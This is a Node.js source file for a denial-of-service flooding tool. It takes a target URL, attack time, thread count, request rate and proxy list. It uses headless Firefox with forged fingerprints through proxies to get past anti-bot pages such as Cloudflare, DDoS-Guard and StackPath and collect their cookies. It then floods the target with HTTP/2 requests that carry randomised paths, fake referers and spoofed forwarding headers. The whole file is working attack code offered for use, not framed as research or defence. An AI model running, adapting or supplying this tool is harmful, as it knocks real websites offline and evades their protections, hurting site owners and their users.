

const {
    firefox
} = require('playwright-extra');
const {
    FingerprintGenerator
} = require('fingerprint-generator');
const {
    FingerprintInjector
} = require('fingerprint-injector');
const {
    UAParser
} = require('ua-parser-js');

process.on('uncaughtException', function (error) {
    //console.log(error)
});
process.on('unhandledRejection', function (error) {
    //console.log(error)
})

var request = require("request");
const fs = require('fs');
const args = require('minimist')(process.argv.slice(2));
const colors = require('colors');

const tls = require('tls');
const dns = require('dns');
const {
    SocksClient
} = require('socks');
const {
    PassThrough
} = require('stream');
const JSStreamSocket = (new tls.TLSSocket(new PassThrough()))._handle._parentWrap.constructor;
const http2 = require('http2');

const url = require('url');
const net = require('net');
const http = require('http');

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0);

const urlT = process.argv[2]; // Target URL
const timeT = process.argv[3]; // Attack Time
const threadsT = process.argv[4]; // Flooder Threads
const rateT = process.argv[5]; // Requests Per IP
const proxyT = process.argv[6]; // Proxy File

function log(string) {
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
    console.log(`[${hours}:${minutes}:${seconds}]`.white + ` - ${string}`);
}

if (process.argv.length < 6) {
    console.log('['.gray + 'Virtualization'.brightGreen + 'API'.white + ']  '.gray + 'Incorrect usage!'.brightGreen);
    console.log('['.gray + 'Virtualization'.brightGreen + 'API'.white + ']  '.gray + 'Usage: '.brightGreen + `node index.js [URL] [Time] [Threads] [RATE] [Proxy File]`.white)
    console.log('['.gray + 'Virtualization'.brightGreen + 'API'.white + ']  '.gray + 'Example: '.brightGreen + `node index.js https://grafana.ventox.lol 300 15 64 proxy.txt`.white)
    process.exit(0);
}

const proxies = fs.readFileSync(proxyT, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(word => word.trim().length > 0);

var parsed = url.parse(urlT);


/* 
    | List of Protections 
*/
const JSList = {
    "js": [{
        "name": "CloudFlare UAM",
        "navigations": 2,
        "locate": "<title>Just a moment...</title>"
    },
    {
        "name": "CloudFlare UAM",
        "navigations": 2,
        "locate": "<div class=\"cf-browser-verification cf-im-under-attack\">"
    },

    {
        "name": "CloudFlare Captcha",
        "navigations": 2,
        "locate": "<h2 class=\"h2\" id=\"challenge-running\">"
    },
    {
        "name": "China",
        "navigations": 1,
        "locate": "<h2>情纾ProxyPool</h2>"
    },
    {
        "name": "BlazingFast v1.0",
        "navigations": 1,
        "locate": "<br>DDoS Protection by</font> Blazingfast.io</a>"
    },
    {
        "name": "BlazingFast v2.0",
        "navigations": 1,
        "locate": "Verifying your browser, please wait...<br>DDoS Protection by</font> Blazingfast.io</a></h1>"
    },
    {
        "name": "Sucuri",
        "navigations": 4,
        "locate": "<html><title>You are being redirected...</title>"
    },
    {
        "name": "StackPath",
        "navigations": 4,
        "locate": "<title>Site verification</title>"
    },
    {
        "name": "StackPath EnforcedJS",
        "navigations": 4,
        "locate": "<title>StackPath</title>"
    },
    {
        "name": "React",
        "navigations": 1,
        "locate": "Check your browser..."
    },
    {
        "name": "DDoS-Guard",
        "navigations": 1,
        "locate": "DDoS protection by DDos-Guard"
    },
    {
        "name": "VShield",
        "navigations": 1,
        "locate": "<title>Captcha Challenge</title>"
    },
    {
        "name": "GameSense",
        "navigations": 1,
        "locate": "<title>GameSense</title>"
    }]
}


/* 
    | Detection of protections on the site
*/
function JSDetection(argument) {
    for (let i = 0; i < JSList['js'].length; i++) {
        if (argument.includes(JSList['js'][i].locate)) {
            return JSList['js'][i]
        }
    }
}


/* 
    | Flooder
*/
async function socksFlood(cookie, ua, proxy) {
    setInterval(() => {
        const parsedProxy = proxy.split(":");

        function pidr(socket) {
            socket.setKeepAlive(true, process.argv[3] * 1000)
            socket.setTimeout(10000);

 const pathts = [
     "?s=", 
     "/?", 
     "?q=", 
     "?true=", 
     "?"
 ];
 const querys = [
     "", 
     "&", 
     "", 
     "&&", 
     "and", 
     "=", 
     "+", 
     "?"
 ];

function randstr(_0xcdc8x17) {
   var _0xcdc8x18 = "";
   var _0xcdc8x19 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   var _0xcdc8x1a = _0xcdc8x19.length;
   for (var _0xcdc8x1b = 0; _0xcdc8x1b < _0xcdc8x17; _0xcdc8x1b++) {
     _0xcdc8x18 += _0xcdc8x19.charAt(Math.floor(Math.random() * _0xcdc8x1a));
   }
   ;
   return _0xcdc8x18;
 }

const ip_spoof = () => {
   const _0xcdc8x15 = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${""}${_0xcdc8x15()}${"."}${_0xcdc8x15()}${"."}${_0xcdc8x15()}${"."}${_0xcdc8x15()}${""}`;
 };
 const spoofed = ip_spoof();

const refers = [
    'http://anonymouse.org/cgi-bin/anon-www.cgi/',
    'http://coccoc.com/search#query=',
    'http://ddosvn.somee.com/f5.php?v=',
    'http://engadget.search.aol.com/search?q=',
    'http://engadget.search.aol.com/search?q=query?=query=&q=',
    'http://eu.battle.net/wow/en/search?q=',
    'http://filehippo.com/search?q=',
    'http://funnymama.com/search?q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/',
    'http://go.mail.ru/search?mail.ru=1&q=',
    'http://help.baidu.com/searchResult?keywords=',
    'http://host-tracker.com/check_page/?furl=',
    'http://itch.io/search?q=',
    'http://jigsaw.w3.org/css-validator/validator?uri=',
    'http://jobs.bloomberg.com/search?q=',
    'http://jobs.leidos.com/search?q=',
    'http://jobs.rbs.com/jobs/search?q=',
    'http://king-hrdevil.rhcloud.com/f5ddos3.html?v=',
    'http://louis-ddosvn.rhcloud.com/f5.html?v=',
    'http://millercenter.org/search?q=',
    'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=',
    'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/',
    'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=',
    'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/',
    'http://page-xirusteam.rhcloud.com/f5ddos3.html?v=',
    'http://php-hrdevil.rhcloud.com/f5ddos3.html?v=',
    'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x&q=',
    'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x/',
    'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf&q=',
    'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf/',
    'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=',
    'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/',
    'http://search.aol.com/aol/search?q=',
    'http://taginfo.openstreetmap.org/search?q=',
    'http://techtv.mit.edu/search?q=',
    'http://validator.w3.org/feed/check.cgi?url=',
    'http://vk.com/profile.php?redirect=',
    'http://www.ask.com/web?q=',
    'http://www.baoxaydung.com.vn/news/vn/search&q=',
    'http://www.bestbuytheater.com/events/search?q=',
    'http://www.bing.com/search?q=',
    'http://www.evidence.nhs.uk/search?q=',
    'http://www.google.com/?q=',
    'http://www.google.com/translate?u=',
    'http://www.google.ru/url?sa=t&rct=?j&q=&e&q=',
    'http://www.google.ru/url?sa=t&rct=?j&q=&e/',
    'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
    'http://www.pagescoring.com/website-speed-test/?url=',
    'http://www.reddit.com/search?q=',
    'http://www.search.com/search?q=',
    'http://www.shodanhq.com/search?q=',
    'http://www.ted.com/search?q=',
    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
    'http://www.usatoday.com/search/results?q=',
    'http://www.ustream.tv/search?q=',
    'http://yandex.ru/yandsearch?text=',
    'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=',
    'http://ytmnd.com/search?q=',
    'https://add.my.yahoo.com/rss?url=',
    'https://careers.carolinashealthcare.org/search?q=',
    'https://check-host.net/',
    'https://developers.google.com/speed/pagespeed/insights/?url=',
    'https://drive.google.com/viewerng/viewer?url=',
    'https://duckduckgo.com/?q=',
    'https://google.com/',
    'https://help.baidu.com/searchResult?keywords=',
    'https://play.google.com/store/search?q=',
    'https://pornhub.com/',
    'https://r.search.yahoo.com/',
    'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=',
    'https://steamcommunity.com/market/search?q=',
    'https://vk.com/profile.php?redirect=',
    'https://www.bing.com/search?q=',
    'https://www.cia.gov/index.html',
    'https://www.facebook.com/',
    'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
    'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
    'https://www.fbi.com/',
    'https://www.google.ad/search?q=',
    'https://www.google.ae/search?q=',
    'https://www.google.al/search?q=',
    'https://www.google.co.ao/search?q=',
    'https://www.google.com.af/search?q=',
    'https://www.google.com.ag/search?q=',
    'https://www.google.com.ai/search?q=',
    'https://www.google.com/search?q=',
    'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=',
    'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=',
    'https://www.npmjs.com/search?q=',
    'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
    'https://www.pinterest.com/search/?q=',
    'https://www.qwant.com/search?q=',
    'https://www.ted.com/search?q=',
    'https://www.usatoday.com/search/results?q=',
    'https://www.yandex.com/yandsearch?text=',
    'https://www.youtube.com/',
    'https://yandex.ru/',
  ];

const cplist = [
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES',
    'ECDHE-RSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES',
    'ECDHE-RSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES',
    'ECDHE-RSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES',
    'ECDHE-RSA-AES128-SHA256:HIGH:MEDIUM:3DES',
    'ECDHE-RSA-AES128-SHA:HIGH:MEDIUM:3DES',
    'ECDHE-RSA-AES256-SHA384:HIGH:MEDIUM:3DES',
    'ECDHE-RSA-AES256-SHA:HIGH:MEDIUM:3DES',
    'ECDHE-RSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES',
    'RC4:ECDHE-RSA-AES128-GCM-SHA256:ECDHE+3DES:RSA+3DES',
    'ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE+AES128:HIGH:MEDIUM:3DES',
    'ECDHE-RSA-AES256-GCM-SHA384:RSA+AES128:RC4+MD5:NULL+SHA:MEDIUM:HIGH:!NULL:RSA+3DES',
    'AEAD-CHACHA20-POLY1305-SHA256:AES-GCM:!MD5:3DES:HIGH:MEDIUM:3DES',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:HIGH:MEDIUM:3DES',
    'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    'options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA',
    ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
];
const sig = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'RSA_PSS_PSS_SHA256',
    'RSA_PSS_PSS_SHA384',
    'RSA_PSS_PSS_SHA512',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
];

var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
var pathts1 = pathts[Math.floor(Math.random() * pathts.length)];
var queryz = querys[Math.floor(Math.random() * querys.length)];
var Ref = refers[Math.floor(Math.random() * refers.length)];


            var requestHeaders = {
                ':authority': parsed.host,
                'Via': 'spoofed',
                'X-Forwarded-For': 'spoofed',
                'X-Forwarded-Proto': HTTPS,
                'Client-IP': 'spoofed',
                'Real-IP': 'spoofed',
                'X-Forwarded-Host': 'spoofed',
                'x-content-type-options': 'nosniff',
                ':method': 'GET',
                'x-requested-with':'XMLHttpRequest',
                ':path': parsed.pathname + pathts1 + randstr(25) + queryz + randstr(25),
                'Referer': Ref,
                ':scheme': 'https',
                'User-Agent': ua,
                'Upgrade-Insecure-Requests': '1',
                'Cookie': cookie,
                'Cache-Control': 'max-age=0',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Ch-Ua-Mobile': '?0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'de,en-US;q=0.7,en;q=0.3;vi,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                'TE': 'trailers'
            }

            const govno = tls.connect(443, parsed.host, {
                ALPNProtocols: ['h2'],
                secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"],
                ciphers: tls.getCiphers().join(":") + cipper,
                echdCurve: 'prime256v1',
                sigals: siga,
                rejectUnauthorized: false,
                servername: url.hostname,
                socket: socket,
                secure: true,
                servername: parsed.host
            });

            govno.setKeepAlive(true, 60 * 10000);

            const client = http2.connect(parsed.href, {
                protocol: "https:",
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 1000,
                    initialWindowSize: 6291456,
                    maxHeaderListSize: 262144,
                    enablePush: true
                },
                maxSessionMemory: 64000,
                maxDeflateDynamicTableSize: 4294967295,
                createConnection: () => govno,
                socket: socket,
            }, () => {
                for (let i = 0; i < rateT; i++) {
                    client.request(requestHeaders).end();
                }
            });
        }

        var req = http.get({
            host: parsedProxy[0],
            port: parsedProxy[1],
            path: parsed.host + ":443",
            timeout: 15000,
            method: 'CONNECT'
        })

        req.end();
        req.on('connect', (_, socket) => {
            pidr(socket);
        });

        req.on('end', () => {
            req.resume()
            req.close();
        });
    })
}

/*
    * The function that creating new browser session.
    * Requiring "proxy" parameter as "string".
    * Nothing for return.
*/
async function doNewSession(proxy) {
    try {
        const fingerprintGenerator = new FingerprintGenerator();

        /* Generating new Browser fingerprint (Firefox) with supported headers */
        const browserFingerprintWithHeaders = fingerprintGenerator.getFingerprint({
            devices: ['desktop'],
            browsers: [{ name: 'firefox', minVersion: 104 }],
            operatingSystems: ['windows'],
        });

        fingerprintGenerator.getFingerprint();

        /* Need for inject headers into browser */
        const fingerprintInjector = new FingerprintInjector();
        const {
            fingerprint
        } = browserFingerprintWithHeaders;

        const navAgent = fingerprint.navigator.userAgent;
        const locales = fingerprint.navigator.language;

        const [ip, port] = proxy.split(":");

        log('['.gray + `${ip}`.green + ':'.white + `${port}`.green + '] '.gray + ' Browser created'.brightGreen + ' -> '.white + `${navAgent}`.brightGreen);

        /* 
            * Function called for create new instance of firefox browser with parametres "proxy", "userAgent that we got from 
            * fingerprint.
            * It uses virtual screen for emulating. (Needed xvfb-run <<<params>>>)
        */
        const browser = await firefox.launch({
            proxy: {
                server: 'http://' + proxy
            },
            args: [
                //'--no-sandbox',
                //'--disable-setuid-sandbox',
                //'--viewport-size 1920, 1080',
                //'--enable-automation',
                //'--disable-blink-features',
                //'--disable-blink-features=AutomationControlled',
                //'--hide-scrollbars',
                //'--mute-audio',
                //'--disable-canvas-aa',
                //'--disable-2d-canvas-clip-aa',
                //'--ignore-certificate-errors',
                //'--ignore-certificate-errors-spki-list',
                //'--disable-features=IsolateOrigins,site-per-process',
                //'--disable-gpu',
                //'--disable-sync',
                //'--disable-plugins',
                //'--disable-plugins-discovery',
                //'--disable-preconnect',
                //'--disable-notifications',
                ////'--disable-setuid-sandbox', // отключить установку UID песочницы
                ////'--disable-dev-shm-usage', // отключить использование /dev/shm
                ////'--disable-accelerated-2d-canvas', // отключить ускорение 2D-холста
                ////'--disable-infobars', // отключить infobars
                ////'--disable-web-security', // отключить защиту веб-безопасности
                //'--no-startup-window',
                //'--enable-monitor-profile',
                //'--no-remote',
                //'--wait-for-browser',
                //'--foreground',
                //'--juggler-pipe',
                //'--silent',
                //'--user-agent=' + navAgent,

                '--use-fake-ui-for-media-stream',
                '--disable-blink-features=AutomationControlled',
                '--disable-features=IsolateOrigins,site-per-process',
                '--renderer-process-limit=1',
                '--mute-audio',
                '--disable-setuid-sandbox',
                '--enable-webgl',
                '--ignore-certificate-errors',
                '--use-gl=disabled',
                '--color-scheme=dark',
                '--user-agent=' + navAgent,

                //'--disable-features=IsolateOrigins,site-per-process,SitePerProcess',
                //'--flag-switches-begin --disable-site-isolation-trials --flag-switches-end',
                `--window-size=1920,1080`,
                "--window-position=000,000",
                //"--disable-dev-shm-usage",
                //'--user-agent=' + navAgent,
                '--no-sandbox',
                //'--disable-setuid-sandbox',
                //'--disable-dev-shm-usage',
                //'--disable-accelerated-2d-canvas',
                //'--no-first-run',
                //'--no-zygote',
                //'--disable-gpu',
                //'--hide-scrollbars',
                //'--mute-audio',
                //'--disable-gl-drawing-for-tests',
                //'--disable-canvas-aa',
                //'--disable-2d-canvas-clip-aa',
                //'--disable-web-security',
            ],
            ignoreDefaultArgs: [
                '--enable-automation'
            ],
            headless: true,
            javaScriptEnabled: true,
            ignoreHTTPSErrors: true,
        });

        const context = await browser.newContext({
            locale: locales,
            viewport: fingerprint.screen,
            isMobile: false,
            hasTouch: false,
            inputDevices: [
                {
                    name: 'my-mouse',
                    type: 'mouse',
                    // Emulate a slow mouse movement
                    precision: 10,
                    isTouch: false,
                },
                {
                    name: 'my-keyboard',
                    type: 'keyboard',
                    // Emulate a slow keyboard typing speed
                    layout: 'en-US',
                    repeatDelay: 100,
                    repeatInterval: 50,
                },
            ],
            //input: {
            //    emulateMouse: true,
            //    emulateTouch: true,
            //    emulateKeyboard: true,
            //},
        });

        //await context.grantPermissions(['camera']);
        //await context.grantPermissions(['microphone']);
        //await context.grantPermissions(['clipboard-write']);


        await fingerprintInjector.attachFingerprintToPlaywright(context, browserFingerprintWithHeaders);

        const parser = new UAParser();
        parser.setUA(navAgent);
        const result = parser.getResult();

        await context.addInitScript(() => {
            ['height', 'width'].forEach(property => {
                const imageDescriptor = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, property);
                Object.defineProperty(HTMLImageElement.prototype, property, {
                    ...imageDescriptor,
                    get: function () {
                        if (this.complete && this.naturalHeight == 0) {
                            return 20;
                        }
                        return imageDescriptor.get.apply(this);
                    },
                });
            });
        });

        await context.addInitScript(() => {
            Object.defineProperty(window.Notification, 'permission', {
                get: () => 'granted',
            });
        });

        await context.addInitScript(() => {
            Object.defineProperty(navigator, 'pdfViewerEnabled', {
                get: () => true,
            });
        });

        /* 
            * From this moment we will use only this.
            * That creating new page in browser.
        */
        const page = await context.newPage({
            locale: locales,
            deviceScaleFactor: 1,
            userAgent: navAgent
        });

        await page.setDefaultNavigationTimeout(0);

        await page.setViewportSize({
            width: 1920,
            height: 1080
        });


        function randomIntFromInterval(min, max) {
            return Math.floor(Math.random() * (max - min + 1) + min)
        }

        // Эмуляция еблана
        //await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
        //await page.mouse.down();
        //await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
        //await page.mouse.up();
        //await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
        //await page.mouse.down();
        //await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
        //await page.mouse.up();
        //await page.keyboard.press('Enter');
        //await page.keyboard.press('1');
        //await page.keyboard.press('R');


        await page.route('***', route => route.continue())
        try {
            await page.goto(urlT, {
                waitUntil: 'commit',
                timeout: 15000
            });
        } catch (e) {
            //console.log(e)
        }

        await page.waitForTimeout(9000);

        const source = (await page.content());
        const cookie = (await page.context().cookies(urlT)).map(c => `${c.name}=${c.value}`).join('; ');
        const title = (await page.title());

        const JS = await JSDetection(source);

        if (title == 'Just a moment...' || title == 'Access denied' || title == 'Problem loading page') {
            await page.close();
            await context.close();
            await browser.close();

            log('['.gray + 'Virtualization'.red + 'API'.white + ']  '.gray + 'Status received'.red + ' -> '.white + `${title}`.red);
        } else {
            if (JS) {
                log('['.gray + 'Virtualization'.yellow + 'API'.white + ']  '.gray + `Protection detected`.yellow + ` -> `.white + `${JS.name}`.yellow);
            } else {
                log('['.gray + 'Virtualization'.green + 'API'.white + ']  '.gray + 'No JS/Captcha'.green)
            }

            log('['.gray + 'Virtualization'.green + 'API'.white + ']  '.gray + 'Browser got Title'.green + ' -> '.white + `${title}`.green);
            log('['.gray + 'Virtualization'.green + 'API'.white + ']  '.gray + 'Browser got Cookies'.green + ' -> '.white + `${cookie}`.green);
            log('['.gray + 'Virtualization'.green + 'API'.white + ']  '.gray + 'Session Solved!'.green);

            await page.close();
            await context.close();

            await socksFlood(cookie, navAgent, proxy);
        }

    } catch (e) {
        console.log(e);
    }
}


const validProxies = [];
function check_proxy(proxy) {
    request({
        url: 'https://google.com',
        proxy: "http://" + proxy,
        headers: {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0",
        },
        time: true
    }, (err, res, body) => {
        if (!err) {
            validProxies.push(proxy);
            log('['.gray + 'Virtualization'.brightMagenta + 'API'.white + ']  '.gray + `Added new proxy`.brightMagenta + ' -> '.white + `${proxy} `.magenta + '('.white + `${res.elapsedTime} ms`.brightMagenta + ')'.white);
        }
    });
}

async function sessionIn() {
    for (let i = 0; i < threadsT; i++) {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];

        doNewSession(proxy);
    }
}

function main() {
    log('['.gray + 'Virtualization'.brightBlue + 'API'.white + ']  '.gray + `Target`.brightBlue + ' -> '.white + `${urlT}`.brightBlue);
    log('['.gray + 'Virtualization'.brightBlue + 'API'.white + ']  '.gray + `Time`.brightBlue + ' -> '.white + `${timeT}`.brightBlue);
    log('['.gray + 'Virtualization'.brightBlue + 'API'.white + ']  '.gray + `Threads (Sessions)`.brightBlue + ' -> '.white + `${threadsT}`.brightBlue);
    log('['.gray + 'Virtualization'.brightBlue + 'API'.white + ']  '.gray + `Proxy File`.brightBlue + ' -> '.white + `${proxyT}`.brightBlue);
    log('['.gray + 'Virtualization'.cyan + 'API'.white + ']  '.gray + `Starting browser...`.cyan);

    sessionIn();
}

main();


setTimeout(() => {
    process.exit(0);
}, timeT * 1000)